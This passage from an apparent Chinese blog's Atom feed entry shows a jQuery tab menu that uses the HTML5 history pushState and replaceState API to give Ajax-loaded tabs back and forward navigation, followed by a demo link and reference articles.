class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;tab col s3&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test?id=test2&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;Test 2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;tab col s3&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test?id=test3&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;Test 3&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;tab col s3&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test?id=test4&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;Test 4&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;ul&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;col s12 &quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; $index = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; eleMenus = $(&lt;span class=&quot;string&quot;&gt;&quot;.tabs a&quot;&lt;/span&gt;).bind(&lt;span class=&quot;string&quot;&gt;&quot;click&quot;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;event&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; query = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.href.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (history.pushState &amp;amp;&amp;amp; query) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            ajax载入~~&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        */&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; title = $(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;).text();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $(&lt;span class=&quot;string&quot;&gt;&quot;#test&quot;&lt;/span&gt;).text(title);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// 添加动画效果&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $(&lt;span class=&quot;string&quot;&gt;&quot;.tabs a&quot;&lt;/span&gt;).removeClass(&lt;span class=&quot;string&quot;&gt;&quot;active&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;).addClass(&lt;span class=&quot;string&quot;&gt;&quot;active&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; $tabs_width = $(&lt;span class=&quot;string&quot;&gt;&quot;.tabs&quot;&lt;/span&gt;).width(), &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $tab_width = $(&lt;span class=&quot;string&quot;&gt;&quot;.tabs&quot;&lt;/span&gt;).find(&lt;span class=&quot;string&quot;&gt;&#39;li&#39;&lt;/span&gt;).first().outerWidth(), &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $prev_index = $index;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $index = $(&lt;span class=&quot;string&quot;&gt;&quot;.tabs a&quot;&lt;/span&gt;).index($(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($index &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $index = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (($index - $prev_index) &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $(&lt;span class=&quot;string&quot;&gt;&quot;.indicator&quot;&lt;/span&gt;).velocity(&amp;#123; &lt;span class=&quot;string&quot;&gt;&quot;right&quot;&lt;/span&gt;: $tabs_width - (($index + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) * $tab_width) &amp;#125;, &amp;#123; duration: &lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;, queue: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;, easing: &lt;span class=&quot;string&quot;&gt;&#39;easeOutQuad&#39;&lt;/span&gt; &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $(&lt;span class=&quot;string&quot;&gt;&quot;.indicator&quot;&lt;/span&gt;).velocity(&amp;#123; &lt;span class=&quot;string&quot;&gt;&quot;left&quot;&lt;/span&gt;: $index * $tab_width &amp;#125;, &amp;#123; duration: &lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;, queue: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;, easing: &lt;span class=&quot;string&quot;&gt;&#39;easeOutQuad&#39;&lt;/span&gt;, delay: &lt;span class=&quot;number&quot;&gt;90&lt;/span&gt; &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $(&lt;span class=&quot;string&quot;&gt;&quot;.indicator&quot;&lt;/span&gt;).velocity(&amp;#123; &lt;span class=&quot;string&quot;&gt;&quot;left&quot;&lt;/span&gt;: $index * $tab_width &amp;#125;, &amp;#123; duration: &lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;, queue: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;, easing: &lt;span class=&quot;string&quot;&gt;&#39;easeOutQuad&#39;&lt;/span&gt; &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $(&lt;span class=&quot;string&quot;&gt;&quot;.indicator&quot;&lt;/span&gt;).velocity(&amp;#123; &lt;span class=&quot;string&quot;&gt;&quot;right&quot;&lt;/span&gt;: $tabs_width - (($index + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) * $tab_width) &amp;#125;, &amp;#123; duration: &lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;, queue: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;, easing: &lt;span class=&quot;string&quot;&gt;&#39;easeOutQuad&#39;&lt;/span&gt;, delay: &lt;span class=&quot;number&quot;&gt;90&lt;/span&gt; &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// history处理&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.title = title;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (event &amp;amp;&amp;amp; &lt;span class=&quot;regexp&quot;&gt;/\d/&lt;/span&gt;.test(event.button)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            history.pushState(&amp;#123; title: title &amp;#125;, title, location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] + &lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt; + query);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fnHashTrigger = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;target&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; query = location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;], eleTarget = target || &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; query == &lt;span class=&quot;string&quot;&gt;&quot;undefined&quot;&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (eleTarget = eleMenus.get(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// 如果没有查询字符，则使用第一个导航元素的查询字符内容&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            history.replaceState(&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.title, location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;#&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] + &lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt; + eleTarget.href.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]) + location.hash;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            fnHashTrigger(eleTarget);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        eleMenus.each(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (eleTarget === &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.href.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] === query) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                eleTarget = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!eleTarget) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// 如果查询序列没有对应的导航菜单，去除查询然后执行回调&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            history.replaceState(&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.title, location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            fnHashTrigger();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $(eleTarget).trigger(&lt;span class=&quot;string&quot;&gt;&quot;click&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (history.pushState) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.addEventListener(&lt;span class=&quot;string&quot;&gt;&quot;popstate&quot;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        fnHashTrigger();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    fnHashTrigger();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Demo-地址&quot;&gt;&lt;a href=&quot;#Demo-地址&quot; class=&quot;headerlink&quot; title=&quot;Demo 地址&quot;&gt;&lt;/a&gt;Demo 地址&lt;/h2&gt;&lt;p&gt;Demo访问地址：&lt;a href=&quot;http://qrframe.com/blog/20160711_javascript_web.html&quot;&gt;http://qrframe.com/blog/20160711_javascript_web.html&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;引用的文章地址&quot;&gt;&lt;a href=&quot;#引用的文章地址&quot; class=&quot;headerlink&quot; title=&quot;引用的文章地址&quot;&gt;&lt;/a&gt;引用的文章地址&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/tianyitianyi1/article/details/7426606&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HTML5 history新特性pushState、replaceState&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.zhangxinxu.com/wordpress/2013/06/html5-history-api-pushstate-replacestate-ajax/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ajax与HTML5 history pushState/replaceState实例&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/flash3d/archive/2013/10/23/3384823.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;利用pushState开发无刷页面切换&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Ajax可以实现页面的无刷新操作，但是，也会造成另外的问题，无法前进与后退。HTML5 history的新特性pushState、replaceState会帮我们实现页面的前进与后退。&lt;/p&gt;
&lt;p&gt;HTML5引入了histtory.pushState()和history.replaceState()这两个方法，他们允许添加和修改history实体。同时，这些方法会和window.onpostate事件一起工作。&lt;br&gt;
    
    </summary>
    
    
      <category term="Web开发" scheme="http://qrframe.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
      <category term="JavaScript" scheme="http://qrframe.com/tags/JavaScript/"/>
    
  </entry>
  
</feed>
